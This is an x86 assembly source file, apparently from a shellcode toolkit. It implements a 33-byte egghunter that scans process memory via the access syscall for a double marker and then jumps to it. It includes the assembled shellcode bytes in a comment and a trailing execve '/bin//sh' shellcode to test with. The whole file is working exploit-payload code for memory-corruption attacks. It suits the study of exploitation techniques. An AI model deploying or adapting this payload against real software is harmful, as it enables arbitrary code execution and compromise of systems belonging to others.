# /*		x86 egghunter - Length: 33 bytes	*/ #
# /*   based on Skape's "Safely Searching Process VAS"	*/ #

.set EGG, 0x34333231
#.set EGG, 0xc0ffee42
.set TIMESMINUSONE, 1
.set FORWARD, 0

# char shellcode[] =
#   "\xfc\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\xb8"\
#   "\x42\xee\xff\xc0"\
#   "\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7";

.macro	checkeggs times=TIMESMINUSONE
	scasl			# cmpl (%edi), %eax; leal 0x4(%edi), %edi
	jnz try_next
.if	\times
	checkeggs "(\times - 1)"
.endif
.endm

.text
.globl _start

	_start:
.if FORWARD
	cld			# clear the direction flag
.else
	std			# set the direction flag
.endif
	push $TIMESMINUSONE
	popl %ecx

	align:
.if FORWARD
	orw $0xfff, %dx		# PAGE_SIZE - 1
	try_next:
	inc %edx		# %ebx
	leal (%edx, %ecx, 4), %ebx
.else
	orw $0xfff, %bx
	leal (%ebx, %ecx, 4), %ebx
	try_next:
	inc %ebx
.endif
	pushl $33		# sys_access
	pop %eax
	int $0x80		# syscall

	# /* if %ebx isn't a valid address, the syscall returns EFAULT */ #
	cmpb $0xf2, %al		# EFAULT?
	jz align		# We then test next page

	movl $EGG, %eax
.if FORWARD
	movl %edx, %edi
.else
	movl %ebx, %edi
.endif
	checkeggs
.if FORWARD
	jmp *%edi
.else
#	lea 0x6(%edi, %ecx, 4), %edi
	jmp code
.endif

# /* The following places the double-egg in memory
#	followed by x86-binsh_short's shellcode
# (test it with 'make c p assembly S=examples/x86-egghunter.s && ./assembly') */
#.data
	.fill TIMESMINUSONE, 4, EGG
	.int EGG
code:
	.ascii "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xd1\xcd\x80"
